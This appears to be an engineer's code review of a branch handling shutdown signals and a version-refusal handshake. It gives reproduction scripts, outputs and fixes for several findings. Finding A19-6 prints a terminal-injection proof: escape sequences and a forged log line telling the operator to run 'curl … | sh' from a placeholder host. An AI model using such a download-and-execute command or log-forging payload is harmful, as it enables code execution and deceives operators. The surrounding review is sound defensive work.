# A.19 review, 2026-11-12: the stop signal and the refusal with a reason

Reviewed: `fix/A.19-stop-and-refusal` at `5add735` (`git diff f13b3dd..HEAD`:
`229cc1d`, `d193f86`, `5add735`). Read in full, then attacked on the branch's
own build (a copy of the binary, since the shared target is rebuilt by other
branches). No product or test source changed; only this report and the
scripts under `crates/cli/tests/support/review_a19/` were added. Machine: Arch
Linux, kernel 7.2.15, bubblewrap 0.13.1, `fusermount3` setuid, the repository
on a rotational USB disk. systemd and Docker were not run (rules of this
machine); claim 5 is reasoned from systemd's documentation. Format and
severity scale as in `2026-11-T8e-guard.md`.

The builder's tests pass here: `stop_signal` 5 of 5, `version_refusal` 3 of
3, `runtime` `a_stop_closes_the_running_turn_and_refuses_new_work`.

## 1. Verdict

**The handshake part holds. The stop holds on the paths the tests walk and
breaks on five others; claim 4 (routines) is not true as written and has no
test.**

What held, with proof: a stranger never learns a version, in any shape of the
new field, with equal timing; a refused handshake does not touch the node's
live link; each kind of turn in flight (model call, sub-agent, approval,
chat runtime, shell) ends `stopped` once, written by its own store, and the
next start adds nothing; a command that ignores SIGTERM or detaches is gone
before exit 0; 192 prompts and 40 approval answers raced against the signal
produced no accepted-and-lost prompt, no turn left open by an exit 0 and no
command run after the stop; a second signal exits in 3 ms and the next start
closes exactly the open turn, once; a stop with the master away replays the
end once; another user sees the same 404 for the owner's chat before and
during the stop.

What did not hold:

| Id | Severity | What | Proof |
|---|---|---|---|
| A19-1 | **Medium** (claims 2 and 3) | After "stopped: every turn is closed" the process does not exit while one of its own blocking threads is stuck (a file tool on a mount that stopped answering). It has already released the data directory's lock, its port is closed, and SIGTERM and SIGINT no longer do anything. A second `serve` starts on the same data directory beside it. | `stop_hang_blocking.py` |
| A19-2 | **Medium** (claim 4; no test exists) | A routine's run cut by a stop is finished `interrupted`, which counts as a failure: five stops pause the routine. A run accepted while the server stops ("run now", a webhook) is answered 202, "retried" only in memory, and ended `interrupted`, "never retried", at the next start. | `routine_stops.py`, `stop_users_routines.py` |
| A19-3 | **Low** (claim 2) | One command of the agent makes every stop take the whole 60 s and end with exit 1 and the turn `interrupted`: the after-turn checkpoint does not see the cancel, and its own limit (60 s) equals the stop's. | `stop_bound.py` |
| A19-4 | **Low** (claim 2) | `node run`: a restore that passed the refusal but has not registered its folder is not seen by the stop. The node exits 0 in 0.2 s with the restore cut, nothing recorded; the caller gets 504 after 15 s. 10 of 10 with the signal 11 to 59 ms after the request. | `restore_race.py` |
| A19-5 | **Low** (claim 2) | When the log cannot be written (full disk) the stop exits 0 and logs "every turn is closed" with the turn's end not in the log. | `stop_full_disk.py` |
| A19-6 | **Low** (claim 1) | The `rejected` reason reaches the node's stderr raw and whole: escape sequences, a forged line in the node's own log shape, 7 MiB. | `review_a19_node_reason.rs` |
| A19-7 | **Low** (claims 1, 5, 6; not run) | The README's unit has `Restart=always`, `RestartSec=5`: a refused node "exits instead of trying again" and is started again every 5 s for ever. A refusal has no exit status of its own to exclude. | reading |
| A19-8 | **Low** (claim 2, the refusal's text) | "send this again once it is back": a refused message with an attachment cannot be sent again, the upload was spent before the node was asked. | `stop_window.py` |
| N-1 to N-12 | Note | start-up, two signals at once, what exit 0 leaves, the absent version, a malformed version, the protocol number, wrong ends, the approval select, commands not refused, the master's log, the tests, the documents | sections 3 to 5 |

Asked for before merge: A19-1 (a few lines in `main`, and its test), A19-2
(either the code or the sentences), A19-5 and A19-4 (a few lines each).
A19-3 is a constant or a bounded snapshot; A19-6 is one function; A19-7 and
A19-8 are a line of unit and a line of text unless the owner wants more.

## 2. Findings

All scripts: `crates/cli/tests/support/review_a19/<name>` (Python 3, no
packages), each starting the real binary on its own data directory under
`<target>/review_a19/run-<pid>/` and a port the kernel picks. Run with
`CARGO_TARGET_DIR` set as for the build; `RIZZY=<binary>` names another
binary. The two Rust proofs run through `run_rust_proofs.sh handshake|reason`,
which copies one file into its crate's `tests/` for the run and removes it.

### A19-1. Medium. A stopped process that does not exit, without its lock, deaf to signals

**Breaks.** Claim 2 ("the process then exits 0"; "the wait is bounded";
"a second signal exits at once") and claim 3 ("none after the process has
released the data-directory lock"; `lock.rs`: "until the process ends").

**Mechanism.** `main` (`cli/src/main.rs:1115-1118`) runs `async_main` on a
runtime built in the same expression. `_lock` is a local of `async_main`
(`:1145`), so the lock file is closed when `async_main` returns; the runtime
is dropped after that, and dropping a tokio runtime waits without limit for
blocking threads that are running. The agent loop abandons a tool 5 s after a
cancel and says itself that "a blocking thread it left keeps running
detached" (`agent-native/src/lib.rs:1888`). The second-signal task and the
signal streams died with the runtime, but the handlers tokio installed stay:
SIGTERM and SIGINT are caught and go nowhere.

**Reproduction.** `python3 stop_hang_blocking.py` (the node's `read` tool on
`fuse_stall.py`'s file, the guard tests' server, unchanged):

```
the node's read tool is waiting in a read of <run>/hang/ws/mnt/stall
5.3 s after SIGTERM the log says: rizzy_harness: stopped: every turn is closed
exit status 15 s later: None (None: still running), process state 'S'
the data directory's lock can be taken by someone else now: True
its HTTP port answers: no (URLError: <urlopen error [Errno 111] Connection refused>)
after one more SIGTERM: exit status None
after one more SIGINT: exit status None
a second `serve` on the same data directory started (pid 2699593) while pid 2698991 is alive [S]; the session's log: … 8:checkpoint 9:turn_ended(stopped)
the second one stops with exit status 0
the mount is released: the first process now ends with exit status 0
```

**Reach.** Not found from inside a contained command (`ls /dev/fuse` there:
"No such file or directory"; the file tools open FIFOs non-blocking,
`tools/src/lib.rs:58`). It is the accident: a
session folder on NFS, sshfs or FUSE whose server went away, which is when an
operator restarts the node. Under the README's unit systemd kills it at 90 s
and records a failed stop. By hand, Ctrl-C does nothing more and the next
`serve` runs beside a live process whose abandoned tool threads still act on
the session folder when the mount comes back. On `f13b3dd` the same hang
followed a Ctrl-C (not run there; same `main`), and SIGTERM ended it; now
only SIGKILL does.

**Smallest fix.** Hold the lock in `main`, outside the runtime, and end the
runtime with a limit: `let rt = …build()?; let r = rt.block_on(…);
rt.shutdown_timeout(Duration::from_secs(1));` with the lock dropped after it
(or `std::process::exit` with the status once `async_main` returned).

**Test.** `stop_signal.rs`, with `fuse_stall.py` as `guard.rs` mounts it:
`read: mnt/stall`, SIGTERM, the process has exited within 15 s; and until it
has, the lock cannot be taken.

### A19-2. Medium. A stop fails a routine's run for good and counts against the routine

**Breaks.** Claim 4, both halves. README `:1282-1284`: "a routine that
falls due waits for the server's next start or retries the node later (it is
not blocked)". `docs/node-update.md` §7.0: "routines retry".

**Mechanism.** (a) `finalize` maps `stopped` to the run status `interrupted`
(`runner.rs:1193`); `counted` takes `interrupted` as a failure (`:842`);
`MAX_FAILURES = 5` in a row pause the routine. (b) Only `tick` looks at
`is_stopping()` (`:139`). "Run now" and a webhook delivery still admit a run
while the server stops; the local runtime refuses with `NODE_STOPPING`;
`launch_failed` calls `retry_later` (`:731`), which queues the retry in
memory for one minute later; the process exits within that minute; the next
start's `reconcile` ends every `pending` run as `interrupted` ("never
retried", `:1203`, `:1217`), again a failure. For `serve`'s own runtimes the
retry A.19 added can never run.

**Reproduction.** `python3 routine_stops.py` (a chat routine whose turn is
running at each of five SIGTERMs, every exit 0):

```
stop 1: exit 0; the run: interrupted, 'the node was stopped while the turn ran'; routine: consecutive_failures, paused_reason = (1, None)
stop 2: … (2, None)
stop 3: … (3, None)
stop 4: … (4, None)
stop 5: exit 0; the run: interrupted, 'the node was stopped while the turn ran'; routine: consecutive_failures, paused_reason = (5, 'failures')
stop 6: run now -> 409 {'error': 'this routine is paused (failures); turn it on again first'}
```

`python3 stop_users_routines.py` (second half; "run now" 0.2 s into a stop):

```
routine, run now, while stopping: 202 {'run_id': '01a1d1dac00c733bb484c17aa3a101e7'}
exit status 0
after the next start, the routine's runs:
  status interrupted, attempt 2, reason 'the server restarted before the run started'
65 s later (past the 1 min retry): [('interrupted', 'the server restarted before the run started')]
```

**Reach.** A long routine scheduled at the hour of a nightly restart; N.9's
updates restart nodes on purpose. No attacker is needed; a webhook's sender
can add pending runs during a stop.

**Smallest fix.** A run ended by a stop gets a status `counted` does not
count (as `cancelled` is not), or is put back to due; `run_now` and the
webhook path answer 503 while `is_stopping()`; a `pending` run found at
start whose last reason was the stop is launched, not ended. Or the
sentences in README, PLAN and §7.0 say what happens.

**Test.** `master/tests/routines_http.rs`: a run whose turn ends `stopped`
leaves `consecutive_failures` at 0; "run now" after `begin_stop()` is 503
and adds no run.

### A19-3. Low. One command makes every stop last 60 s and end as a failure

**Breaks.** Claim 2: the attacker's "delay the exit past the bound, make the
stop record a wrong end". The bound itself holds (60.6 s).

**Mechanism.** `run_turn` takes the after-turn checkpoint before it writes
the end (`session.rs:695-698`); the snapshot does not look at the cancel and
has its own limit, `SNAPSHOT_TIMEOUT = 60 s` (`git.rs:107`), the same as
`STOP_WAIT` (`stop.rs:25`), and it starts after the cancel. `stop.rs` says
the checkpoint "took up to 15.5 s on a slow disk"; a sparse file makes it as
long as one likes at no disk cost.

**Reproduction.** `python3 stop_bound.py` (the turn runs
`truncate -s 60G big; sleep <n>`):

```
the command made a sparse 60G file (0 bytes on disk) and sleeps
0.0 s after SIGTERM the command is gone
exit status 1, 60.6 s after SIGTERM
    Error: stopped after 60 s with 1 turn(s) still running (sessions 01a1d1f6-…): the next start closes them as interrupted
alive right after the exit: nothing
next start: ends ['interrupted']; 6:tool_call_started 7:tool_call_finished 8:error(The node restarted while this turn was running. …) 9:turn_ended(interrupted)
```

The command was killed in the first 100 ms; the 60 s are the node's own git.
The turn loses its `after` checkpoint and cannot be restored, as after a
crash. This is the first run that reaches the bound: no test of the branch
does.

**Smallest fix.** While the node stops, give the after-turn snapshot what is
left of the stop's wait minus a margin (or skip it and say so in the
`checkpoint` event); or derive `STOP_WAIT` from its parts
(`TOOL_CANCEL_GRACE + SNAPSHOT_TIMEOUT` + margin) and move `TimeoutStopSec`
and the Docker text with it.

**Test.** This script as a test: exit 0 and `stopped` with a folder whose
snapshot takes longer than the stop.

### A19-4. Low. `node run` exits 0 through a restore it accepted

**Breaks.** Claim 2 ("a restore … is refused"); `NodeRuntime::stop`'s own
comment ("waits for every turn and restore to end").

**Mechanism.** `handle` checks the flag (`node/src/lib.rs:689`), then the
restore writes its audit row, reads the log and opens the checkpoint
repository before `claim_folder` registers it (`session.rs:1120`). `stop`
sets the flag and looks once (`lib.rs:956`): no turn, no registered restore,
return. `prompt` closes the same window by checking again after its claim
(`session.rs:491`); the restore does not. `serve` is covered by accident: the
restore's HTTP request holds the 30 s grace open.

**Reproduction.** `python3 restore_race.py 10` (a real `serve --node-listen`
and `node run`; the restore is made slow by a sparse file so the outcomes
differ in time):

```
try 0, SIGTERM 24.3 ms after the request: node exit 0 in 0.2 s; caller: 504 {'error': 'node did not answer in time'} (15.0 s); file.txt: two; node's audit rows for the restore: 1; checkpoint events: ['before', 'after'] -> cut
… (10 lines alike, 11.6 to 58.7 ms)
outcomes: {'cut': 10}
```

Control, `restore_race.py 2 8G 1500` (the signal after it registered):

```
try 0, SIGTERM 1500.0 ms after the request: node exit 0 in 11.0 s; caller: 200 {'ok': True} (12.2 s); file.txt: (removed: restored); … ['before', 'after', 'before_restore', 'after', 'restored'] -> waited
```

Here the cut fell in the restore's first snapshot, so the folder was
untouched. With an ordinary folder the 200 ms the node gives itself can end
inside the file writes; the `before_restore` checkpoint then makes it
recoverable (A.16), as after a kill.

**Smallest fix.** In `claim_folder`, under the registry's lock, refuse with
`NODE_STOPPING` when the flag is set (the flag is set before `stop` takes
that lock, so one of the two sees the other).

**Test.** `node/tests/runtime.rs`: `stop` called between the restore's
`handle` and its claim (a test hook, or 200 restores against 200 stops):
every restore is either refused or finished before `stop` returns.

### A19-5. Low. Exit 0 and "every turn is closed" with the end not written

**Breaks.** The question "does exit 0 ever happen with a turn not closed":
yes. Claim 2's "recorded as `stopped`".

**Mechanism.** `end_turn` sets `unclosed` when the end cannot be appended and
frees the slot (`session.rs:760`); `stop` asks only `is_running()`.

**Reproduction.** `python3 stop_full_disk.py` (file size limit 0 set on the
script's own server once its turn runs; SIGXFSZ ignored: every write fails):

```
exit status 0, 0.2 s after SIGTERM; the log's last lines:
    ERROR harness_node::session: could not write the session log; stopping the turn session=01a1d1ee-… error=sqlite: disk I/O error
    INFO rizzy_harness: stopped: every turn is closed
the command is gone: True
next start: ends ['interrupted']; … 7:error(The node restarted while this turn was running. …) 8:turn_ended(interrupted)
```

**Smallest fix.** `stop` returns the sessions whose `unclosed` is set with
those still running; `stopped()` names them and exits 1.

**Test.** `node/tests/runtime.rs` with the store that fails appends (the
log-failure tests have one): `stop` returns the session.

### A19-6. Low. What a master can write on a node's terminal

**Breaks.** Claim 1 where it tells the operator to read the reason; the
attacker "a master that lies to a node".

**Mechanism.** `node_handshake` returns `LinkError::Rejected(reason)` as
received; `main` prints the error with `{:?}` of anyhow, which does not
escape. The link's frame limit is the only bound.

**Reproduction.** `sh run_rust_proofs.sh reason` (a stand-in master with the
right certificate, the real `node run`):

```
exit status Some(1) after 104.534995ms; stderr, escaped:
    Error: rejected: x\u{1b}[2J\u{1b}[H\n
    2026-11-12T00:00:00.000000Z  INFO rizzy_harness: update verified; run: curl https://example.invalid/fix | sh\u{7}\r\n
ESC bytes written raw to the node's stderr: 2; a line that starts as the node's own log lines do: true
a reason of 65536 bytes: exit status Some(1) after 106.2443ms, 66848 bytes on stderr
a reason of 1048576 bytes: exit status Some(1) after 105.25848ms, 1049888 bytes on stderr
a reason of 7340032 bytes: exit status Some(1) after 196.816526ms, 7341344 bytes on stderr
```

A master can already ask the node for anything inside `node.toml`; this is
outside it: the node owner's terminal and journal. The printed line also
does not say who refused (`.context("the link to the master")` at
`main.rs:844` is on the task's join, not on the link's error).

**Smallest fix.** Where the reason is received: drop control characters,
cut at a few hundred characters (the master's `clean_label` does this for a
node's strings), and print "the master refused this node: …".

**Test.** This proof with asserts: no byte below 0x20 except the final
newline, at most N characters.

### A19-7. Low. The README's unit starts a refused node again every 5 s

**Breaks.** Claim 1 ("exits non-zero instead of reconnecting") as the README
states it (`:1271`: "exits with that message instead of trying again") under
the README's own unit (`:1346-1347`). Not run.

**Reasoning.** `Restart=always` restarts after any exit that is not a
`systemctl stop`. A refused node lives about 0.1 s (A19-6's times), so one
start per 5.1 s: under the default start limit (5 starts in 10 s), so for
ever. Each start is one handshake, one WARN on the master (no limit, no
audit row) and one error on the node. That is what the row called
"reconnects forever", now with the reason. The refusal exits 1 like every
other error, so the unit cannot exclude it.

**Smallest fix.** A status of its own for "refused by the master" (§7.0
already reserves 75 and 76) and `RestartPreventExitStatus=<it>` in the unit;
or the README says the unit keeps trying every 5 s and how to stop it.

**Test.** `a_node_refused_for_its_version_exits_with_the_reason` asserts the
status.

### A19-8. Low. "Send this again" does not work for a message with a file

**Breaks.** The refusal's fixed text.

**Mechanism.** The prompt handler takes (deletes) the uploads before it asks
the node (`master/src/http.rs:1219`); the node refuses; nothing puts them
back. The same was true for an absent node before A.19; the new text is what
promises otherwise.

**Reproduction.** `python3 stop_window.py`:

```
  prompt with the attachment         -> 503 {'error': 'this node is stopping (…): send this again once it is back'}
after the next start:
  the refused prompt, sent again     -> 400 {'error': 'unknown or already used attachment; upload it again'}
```

**Smallest fix.** Put the uploads back when the node answers
`NodeStopping`, `NodeOffline` or `Timeout`; or take them only after the ack.

**Test.** `master/tests`: a prompt with an attachment to a stopping node,
then the same prompt again, is accepted.

## 3. Notes

- **N-1. A stop signal during start-up is not a stop.** `Signals::install`
  runs after all start-up work, so until then SIGTERM kills (as before).
  `signals.py startup` (a data directory with a turn left open by a kill):
  SIGTERM 0 to 120 ms after `exec`: status -15; from 160 ms: exit 0. A kill
  between the two appends of `recover_interrupted` leaves an `error` without
  its end, and each such start adds another: the full start after sixteen
  tries showed `7:error(The node restarted…) 8:error(…) 9:error(…)
  10:turn_ended(interrupted)`. One end, three messages. Not new; the window
  grows with the number of open sessions. As PID 1 (Docker) a signal before
  the handler exists is dropped, not fatal: not run here.
- **N-2. Two signals in the same instant are one.** `signals.py twice`:
  SIGTERM twice back to back, ten runs: `0 in 2.57 s` ten times (the stop,
  not the forced exit). tokio merges them. No person types that fast.
- **N-3. What exit 0 can leave.** `stop_commands.py stuck`: a command in a
  read the kernel cannot interrupt: `exit status 0 2.7 s after SIGTERM`,
  its guard alive until the mount answered; the tool result says so, the
  stop's last line ("every turn is closed") does not. `stop_commands.py off`
  (`contain = "off"`): `alive 5 s later: sleep 975415` after a clean exit 0;
  `stop.rs` says it, the README's stop section ("it and everything it
  started are killed", "Nothing is left running") does not.
- **N-4. "No version is protocol 1" is compatibility code** by `CLAUDE.md`'s
  rule, five lines. A required field is simpler. It breaks: the one test
  that writes the hello without it (`a_hello_without_a_version_is_protocol_1`,
  which would become "is closed without an answer"), and a node built before
  A.19, which would get no reason (N-5), on data that the same rule says is
  wiped. Nothing else: `client.rs` is the only place that builds
  `Hello::Auth`, and the embedded node does not use the wire handshake. Take
  the default out or get the owner's yes.
- **N-5. A version of the wrong type is answered with a closed socket**, for
  the node's own key and a stranger alike (`the_fields_shapes`: `-1`, `1.0`,
  `"1"`, `null`, 2^32, a field given twice). So a future build that changes
  the field's type is back to "retries for ever without a reason"; and a
  stranger can tell an A.19 master from an older one (which ignored the
  field and answered "unknown or revoked node"). One bit, no version.
- **N-6. `PROTOCOL_VERSION` is still 1** though the hello gained a field and
  `turn_ended` a value. An older master with this node shows "turn stopped"
  unstyled and ends a routine's run as `error`; an older node binary on this
  data directory cannot fold a log that holds `stopped`. Before the first
  tag that is allowed; it is also exactly what the new check exists to name.
- **N-7. Wrong ends, by reading (not proven).** A turn the user cancelled
  just before the signal, and a turn that completed and is in its
  after-turn checkpoint when the signal comes, both end `stopped`
  (`session.rs:702-707`: the flag is read when the end is written).
- **N-8. The approval wait is an unbiased `select!`** (`session.rs:1854-1860`):
  an "allow" that arrives after the cancel and before the task is polled can
  win. `stop_race.py approvals 40`: 24 recorded `allow by user` (each at or
  before the stop's log line to the millisecond), 15 answered 409, 1 denied;
  the command ran in 0 of 40. Not proven; `biased;` with the cancel first
  closes it.
- **N-9. Not refused while stopping:** `set_agent` and `select_variant`
  append to a session's log after the stop began (reading; written by the
  session's own actor). A node of another protocol can still `node join`
  (the token is spent, the key registered) and is refused at `node run`.
- **N-10. The master's log.** A version refusal is one WARN per handshake,
  with the node's registered id and two numbers; no audit row and no limit.
  Only a holder of a registered key can cause it. Nothing an unauthenticated
  peer sends reaches a log line that did not exist before.
- **N-11. Tests** (by reading; `f13b3dd` was not built). Fail on `f13b3dd`
  and test the claim: `a_protocol_mismatch_is_refused_before_accepted_with_the_reason`;
  four of `stop_signal.rs`; the `runtime.rs` one. Pass on `f13b3dd` too:
  `a_hello_without_a_version_is_protocol_1` (the old master accepted any
  hello), `an_unauthenticated_peer_does_not_learn_the_version` (a guard for
  the order, good to have) and
  `a_node_refused_for_its_version_exits_with_the_reason` (every `rejected`
  already ended the loop; the master is a stand-in, so no test joins the
  real refusal to the real exit). No test: the bound and exit 1 (A19-3
  reaches it); claim 4 at all; a refused restore or stage; `node run`'s
  second signal; a stop with the link down; the lock at exit.
- **N-12. Documents.** Beyond A19-2, A19-7 and N-3: `PLAN.md` and the
  README say the lock "is released by the kernel" and "stays locked while a
  stop waits", true during the wait, not at the end (A19-1).
  `docs/node-update.md` §7.0 lists what is left to N.9 correctly.

## 4. Per question: what was tried and what it showed

Outputs are the scripts' own lines, cut at `…`; where several lines say the
same they are drawn into one (the handshake table, `stop_commands.py`,
`stop_window.py`).

**The handshake.** `sh run_rust_proofs.sh handshake` (three tests against a
real `Master::serve_nodes`):

```
protocol_version       | the node's own key                        | a stranger's key (the node's id | an unknown id)
absent                 | {"type":"accepted","node_id":"box"}       | unknown or revoked node | unknown or revoked node
1                      | accepted                                  | same | same
0                      | rejected "this node speaks protocol 0 and…" | same | same
2                      | rejected "this node speaks protocol 2 and…" | same | same
u32::MAX               | rejected "this node speaks protocol 42949…" | same | same
u32::MAX+1, -1, 1.0, 1e400, "1", null, [1], 2000 digits, twice, a 1 MiB string
                       | closed without an answer                  | closed | closed
a second handshake claiming 2: rejected … ; claiming 0: rejected …
after two refused handshakes with its key, the live link is still up: true
auth says 1, node.hello says 2: the master then sends Ok(Ok(None)); listed as connected: false
claim (none)  median 42.07 ms; claim 1  median 42.03 ms; claim 99  median 42.12 ms   (40 each, a stranger)
```

The comparison is after `identity::verify` on the only path that has it
(`auth`); `join` carries no version; the refusal returns before
`remote_stops.insert`, so a superseded connection is not cancelled by a
refused one. The reason holds two integers and the crate version, nothing
from the peer.

**Each kind of work in flight.** `python3 stop_kinds.py`, read from
`node.db` and `chat.db` after the exit:

```
exit status 0, 2.6 s after SIGTERM
  node.db  1 model call          started 1, ends ['stopped'], seq contiguous True
  node.db  2 sub-agent (parent)  started 1, ends ['stopped'], seq contiguous True
  node.db  @scout: slow: 120000  started 1, ends ['stopped'], seq contiguous True
  node.db  4 approval            started 1, ends ['stopped'], approvals ['deny by cancelled'], seq contiguous True
  chat.db  5 chat runtime        started 1, ends ['stopped'], seq contiguous True
  node.db  6 shell               started 1, ends ['stopped'], seq contiguous True
the next start added nothing to any log: True
```

A file tool: A19-1. A restore: A19-4. A routine's run: A19-2. A web tool:
not tested, the fetch of this script's own silent server on 127.0.0.1 was
refused by the tool before the stop (`ends ['completed']`), and no other
machine may be contacted.

**Processes after the exit.** `python3 stop_commands.py`:

```
[term]   exit status 0 2.6 s after SIGTERM; alive right after the exit: nothing; tool result: [cancelled: the command and everything it started were killed; its guard confirmed the end (2001 ms)]
[detach] exit status 0 0.6 s; nothing; … confirmed the end (0 ms)
[many]   exit status 0 3.3 s; nothing; three sessions, each ['stopped']
[stuck]  exit status 0 2.7 s; alive: the guard, until the mount was released (N-3)
[off]    exit status 0 2.7 s; alive 5 s later: sleep 975415 (N-3)
```

**The refusal window.** `python3 stop_window.py` (0.26 s into a stop):
prompt 503, new session 503 (no row left: listed 5 before, 4 after the
delete), restore 503, `allow` 409 "no such pending approval", cancel 200,
delete 200, events 200; exit 0; `must-not-exist` absent; the approval
`deny by cancelled`. `python3 stop_race.py prompts 8` (192 prompts sent 150 ms
before to 20 ms after the signal):

```
  answered 200, turns started 1, ends ['stopped']: 19
  answered 503, turns started 0, ends []: 173
violations: 0
```

**Another user.** `python3 stop_users_routines.py`: six requests against the
owner's running chat and against an id that does not exist, before and
during the stop: 24 answers, all `404 unknown session`, `answers that
differ: 0`. `visible_session` runs before any node is asked in every handler.

**The second signal and the bound.** `python3 signals.py second`:

```
SIGTERM, then SIGINT 0.5 s later: exit status 1 0.003 s after the second; alive right after: 4 process(es)
alive 5 s later: nothing
next start, quick : ends ['stopped']
next start, slow  : ends ['interrupted']
third start, quick : ends ['stopped'];  third start, slow : ends ['interrupted']
```

The bound: A19-3. SIGHUP and SIGQUIT (`signals.py hup quit`): status -1 and
-3, nothing alive 6 s later, the turn `interrupted` once: unchanged, a crash.

**The link down.** `python3 node_link.py`:

```
1. the server, its remote node mid-turn: exit status 0 in 0.4 s; the node's command is still running: True
2. the node, its server away: exit status 0 in 0.4 s; its command is gone: True
3. the server alone again: ends []; last seq 6;   a prompt to that chat meanwhile: 503 'node <id> is not connected'
4. the node back: ends ['stopped']; seqs once and in order: True; … 9:turn_ended(stopped)
   a new turn runs after it: 200; ends ['stopped', 'completed']
```

**A full disk.** A19-5.

**The new reason in every reader.** Node fold and store: typed, `Stopped`
added. Master: keeps events raw; `finalize` maps it (A19-2). Web: the type,
the string and the style were added; `Conversation.tsx:552` prints `turn
{reason}` for any value. No other reader was found (`git grep` for the
other reasons' names in `crates` and `web/src`: routines and the UI only).
The value is a
Rust enum on the node; nothing the model or the user writes reaches it, the
refusal text is a constant, the version reason is two integers.

**Not tested, and why.** systemd and Docker (rules); a web tool in flight
(above); a stop exactly inside one append (the races above are the nearest);
`f13b3dd`'s behaviour in A19-1 (not built; same `main`); N-7 and N-8.

## 5. Verdict per claim

1. **Holds on the wire** (order, reason, stranger, exit status non-zero).
   What the operator then sees is unsanitised (A19-6) and the README's unit
   undoes "instead of reconnecting" (A19-7). "No version is protocol 1" is
   compatibility code (N-4).
2. **Holds on the tested paths; five holes:** no exit with a stuck thread
   (A19-1), the bound reachable by one command with a wrong end (A19-3), a
   restore cut on `node run` (A19-4), exit 0 with an unwritten end (A19-5),
   "send this again" false with a file (A19-8).
3. **Holds during the wait; not at the end:** the lock is released before
   the process is gone, for as long as a blocking thread lives (A19-1). Every
   event of a stopping turn was written by its own store, once.
4. **Does not hold.** A stop fails the run it cuts and counts toward the
   pause; a run taken during the stop is lost as `interrupted` (A19-2). The
   scheduler does start nothing while stopping (reading). No test.
5. **`KillMode=mixed`, `TimeoutStopSec=90`, no `KillSignal` do what the
   README says for a stop** (reasoned; 60 s + 2 s + 0.2 s < 90 s for a node).
   `Restart=always` beside it contradicts the paragraph above the unit
   (A19-7). Not run.
6. **§7.0 and the N.9 split are accurate.** Three sentences claim more than
   is built: routines (A19-2), "nothing is left running" (N-3), "exits
   instead of trying again" under the unit (A19-7).

## 6. Left clean

Every script kills what it started by pid and prints `cleanup killed: …`
(`nothing` in every run reported here). After the last run: no process with
`review_a19` in its command line or working directory, no `sleep 97xxxx` to
`98xxxx`, no line with `review_a19` or `t8e-stall` in `/proc/self/mountinfo`.
The owner's server was never signalled and its data directory never opened.
